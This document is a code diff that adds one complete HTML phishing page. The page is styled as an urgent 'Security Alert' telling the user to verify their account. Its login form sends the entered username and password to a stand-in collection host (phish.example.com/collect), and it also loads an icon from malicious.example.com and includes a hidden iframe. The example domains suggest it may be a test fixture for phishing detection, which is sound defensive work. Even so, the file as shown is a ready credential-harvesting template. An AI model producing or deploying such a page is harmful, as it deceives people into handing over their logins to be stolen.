@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Security Alert - Verify Your Account Now</title>
+  <link rel="icon" href="http://malicious.example.com/fav.ico">
+  <style>
+    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; margin: 40px; }
+    .card { max-width: 360px; margin: auto; border: 1px solid #ddd; border-radius: 6px; padding: 16px; }
+    h1 { font-size: 18px; margin-top: 0; color: #c62828; }
+    input, button { width: 100%; padding: 8px; margin: 6px 0; }
+    .note { color: #c62828; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Security Alert</h1>
+    <p class="note">Urgent action required: Verify your account to prevent restricted access.</p>
+    <form method="POST" action="http://phish.example.com/collect">
+      <input type="text" name="username" placeholder="Email or Username">
+      <input type="password" name="password" placeholder="Password">
+      <button type="submit">Verify Now</button>
+    </form>
+    <iframe src="about:blank" style="display:none;"></iframe>
+  </div>
+</body>
+</html>
